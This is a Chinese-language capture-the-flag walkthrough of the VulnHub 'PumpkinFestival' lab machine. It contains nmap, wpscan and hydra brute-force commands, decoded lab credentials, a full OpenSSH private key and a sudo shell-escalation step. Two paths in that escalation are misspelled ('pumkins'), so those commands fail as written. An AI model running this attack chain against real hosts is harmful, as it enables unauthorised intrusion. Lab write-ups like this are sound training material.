# PumpkinFestival-WalkThrough

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**靶机地址**
- https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkinfestival,329/

**Description**

Mission-Pumpkin v1.0 is a beginner level CTF series, created by keeping beginners in mind. This CTF series is for people who have basic knowledge of hacking tools and techniques but struggling to apply known tools. I believe that machines in this series will encourage beginners to learn the concepts by solving problems.

PumpkinFestival is Level 3 of series of 3 machines under Mission-Pumpkin v1.0. The Level 1 ends by accessing PumpkinGarden_Key file. Level 2 is about identifying pumpkin seeds.

In this level (Level 3) it is time for Pumpkin Festival, the goal is to reach root and access PumpkinFestival_Ticket and collect PumpkinTokens on the way.

**知识点**
- 字符加解密
- ssh密钥使用
- wpscan

**实验环境**

`环境仅供参考`

- VMware® Workstation 15 Pro - 15.0.0 build-10134415
- kali : NAT 模式,192.168.141.134
- 靶机 : NAT 模式

---

# 前期-信息收集

开始进行 IP 探活

```bash
nmap -sP 192.168.141.0/24
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/1.png)

排除法,去掉自己、宿主机、网关,这里 `192.168.141.130` 是靶机的地址。

扫描开放端口
```bash
nmap -T5 -A -v -p- 192.168.141.130
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/2.png)

似曾相识啊,ftp 允许匿名登录
```bash
ftp 192.168.141.130
    anonymous
    密码为空,直接回车
ls
cd secret
ls
get token.txt
bye

cat token.txt
PumpkinToken : 2d6dbbae84d724409606eddd9dd71265
```

获得了个 token,之后应该会用到,看看 web

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/3.png)

网页源码中的 token
```
PumpkinToken : 45d9ee7239bc6b0bb21d3f8e1c5faa52
```

看下 robots.txt

在 http://192.168.141.130/store/track.txt 中可以找到一个 Tracking code 和一个邮箱

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/4.png)

下一步在host中添加上面的邮箱域名
```
echo "192.168.141.130 pumpkins.local" >> /etc/hosts
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/5.png)

访问可以发现一个 wordpress 页面和 token
```
PumpkinToken : 06c3eb12ef2389e2752335beccfb2080
```

除了这个域名以外还有一个 token 路径,爆破出 http://192.168.141.130//tokens/token.txt

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/6.png)

第四个 token
```
PumpkinToken : 2c0e11d2200e2604587c331f02a7ebea
```

下面用 wpscan 尝试打 wordpress
```bash
wpscan --url http://pumpkins.local -e at -e ap -e u
```

发现2个用户和一个readme

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/7.png)

- http://pumpkins.local/readme.html

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/8.png)

访问发现是个加密字符串,像是 base64,解出来是 base62
```
K82v0SuvV1En350M0uxiXVRTmBrQIJQN78s

morse & jack : Ug0t!TrIpyJ
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/9.png)

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/10.png)

登录后发现一个 token
```
PumpkinToken : 7139e925fd43618653e51f820bc6201b
```

通过之前 wpscan 的扫描结果,还存在一个用户 admin ,最开始的网站主页最底下有个 Alohomora! 就是 admin 的密码


登录后发现2处 token

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/11.png)

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/12.png)

```
PumpkinToken : f2e00edc353309b40e1aed18e18ab2c4
PumpkinToken : 06c3eb12ef2389e2752335beccfb2080
```

接下来爆破 FTP,主页中提到过一个用户名 harry
```bash
hydra -l harry -e nsr -P /usr/share/wordlists/rockyou.txt ftp://192.168.141.130
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/13.png)

连接
```
ftp 192.168.141.130
    harry
    yrrah
```

最后下载到2个 token.txt 和 data.txt

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/14.png)

```
PumpkinToken : ba9fa9abf2be9373b7cbd9a6457f374e
PumpkinToken : f9c5053d01e0dfc30066476ab0f0564c
```

data.txt 无法直接读,看下类型

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/15.png)

压缩文件,解压
```bash
tar -xvf data.txt
tar -xvf data
tar -xvf key
cat jack
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/16.png)

hex 解一下是SSH的密钥

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/17.png)

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
16k4l9SUtcrJAAAACXJvb3RAa2FsaQE=
-----END OPENSSH PRIVATE KEY-----
```

使用这个 ssh 密钥登录
```bash
xxd -r -p jack >> sshkey

chmod 600 sshkey
ssh jack@192.168.141.130 -i sshkey -p 6880
ls
file token
./token
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/18.png)

```
PumpkinToken : 8d66ef0055b43d80c34917ec6c75f706
```

尝试提权
```bash
sudo -l
```

密码是之前用 base62 解出的 Ug0t!TrIpyJ

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/19.png)

可以已 root 权限运行 alohomora 程序,但是并没有找到这个文件，那直接创建个可提权的程序即可

```bash
mkdir pumpkins
echo "/bin/sh" > /home/jack/pumpkins/alohomora
chmod +x /home/jack/pumkins/alohomora
cd /home/jack/pumkins/
sudo ./alohomora
id
cd /root
ls
cat PumpkinFestival_Ticket
```

提权成功

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/Mission-Pumpkin/PumpkinFestival/20.png)

---

> 注 : 该靶机起码有11个token, http://pumpkins.local/license.txt 下还有一个 PumpkinToken : 5ff346114d634a015ce413e1bc3d8d71
